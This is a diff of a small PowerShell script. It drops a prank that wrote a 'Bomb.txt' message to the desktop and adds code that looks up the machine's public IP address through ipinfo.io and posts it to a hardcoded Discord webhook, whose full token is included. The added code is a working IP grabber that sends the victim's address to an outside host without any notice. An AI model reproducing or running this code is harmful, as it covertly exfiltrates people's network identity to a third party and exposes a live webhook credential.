@@ -1,5 +1,7 @@
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$fileName = "Bomb.txt"
-$filePath = Join-Path -Path $desktopPath -ChildPath $fileName
-Set-Content -Path $filePath -Value "Бомба сброшена!"
-Invoke-Item -Path $filePath
+$dgf = "https://discord.com/api/webhooks/1308285020258963507/nxXfrF6kk4bhYkAjWjLp1kJCDucYPV-XJd7ZaVl_w8XEdmFthT9K1P0NoT0aBJ1NnpAJ"
+$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+$wwwww = $ipInfo.ip
+$me = @{
+    content = "+ 🐹: $wwwww"
+}
+Invoke-RestMethod -Uri $dgf -Method Post -Body ($me | ConvertTo-Json) -ContentType "application/json"
